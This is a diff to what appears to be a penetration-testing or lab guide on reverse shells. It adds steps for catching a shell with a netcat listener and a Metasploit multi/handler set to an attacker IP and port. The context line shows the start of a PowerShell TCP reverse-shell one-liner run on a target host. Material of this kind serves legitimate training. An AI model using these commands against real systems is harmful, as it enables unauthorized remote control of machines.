@@ -45,12 +45,24 @@ target-host> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClie
 
 ### Setting up a listener on our attacking machine:
 
+#### Using netcat
+
 ```bash
 attacking-machine$ nc -lvnp 1234
    -l Listen mode.
    -v Verbose mode.
    -n Disable DNS resolution and only connect from/to IPs, to speed up the connection.
    -p 1234 Port number netcat is listening on.
+```
+
+#### Using metasploit
+
+```bash
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+msf6 exploit(multi/handler) > set LPORT 1337
+msf6 exploit(multi/handler) > run
 ```
 
 #### Results of the injection:
